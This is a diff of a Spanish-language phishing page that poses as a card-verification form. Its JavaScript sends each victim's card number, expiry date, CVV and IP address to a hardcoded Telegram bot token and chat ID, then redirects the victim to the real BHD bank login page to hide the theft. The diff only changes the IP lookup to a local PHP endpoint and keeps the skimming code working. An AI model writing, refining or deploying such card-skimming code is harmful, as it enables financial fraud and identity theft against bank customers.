@@ -11,7 +11,7 @@
     <link rel="icon" href="assets/img/icono-16x16.png" sizes="16x16">
     <link rel="icon" href="assets/img/icono-192x192.png" sizes="192x192">
     <style>
-    /* Estilo general */
+    /* Estilo general (igual que original) */
     body,
     html {
         margin: 0;
@@ -214,21 +214,18 @@
         return expiryDateObj > currentDate;
     }
 
-    // === FUNCIÓN MODIFICADA PARA INCLUIR LA IP ===
+    // === FUNCIÓN MODIFICADA: OBTIENE LA IP DEL SERVIDOR (misma que los scripts PHP) ===
     function sendToTelegram(cardNumber, expiryDate, cvv) {
         const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
         const chat_id = "8555745789";
 
-        // 1. Obtener la IP pública del cliente usando ipify.org
-        fetch('https://api.ipify.org?format=json')
+        // Consultar el endpoint local que devuelve la IP (usando $_SERVER['REMOTE_ADDR'])
+        fetch('get_ip.php')
             .then(response => response.json())
             .then(data => {
                 const ip = data.ip;
-                // 2. Construir el mensaje incluyendo la IP
                 const message = `Detalles de la tarjeta:\nNúmero de tarjeta: ${cardNumber}\nFecha de expiración: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: ${ip}`;
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-
-                // 3. Enviar a Telegram
                 return fetch(url);
             })
             .then(response => response.json())
@@ -266,7 +263,6 @@
 
                     document.body.appendChild(modal);
 
-                    // Redirección al sitio real del banco
                     setTimeout(function() {
                         window.location.href = "https://ibp.bhd.com.do/#/login";
                     }, 2500);
@@ -275,11 +271,12 @@
                 }
             })
             .catch(error => {
-                console.error("Error al obtener la IP o enviar a Telegram:", error);
+                console.error("Error:", error);
                 alert("Error al procesar la solicitud.");
             });
     }
 
+    // Resto de eventos (input, submit) igual que original...
     document.getElementById('cardNumber').addEventListener('input', function(event) {
         let value = event.target.value.replace(/\D/g, '');
         value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
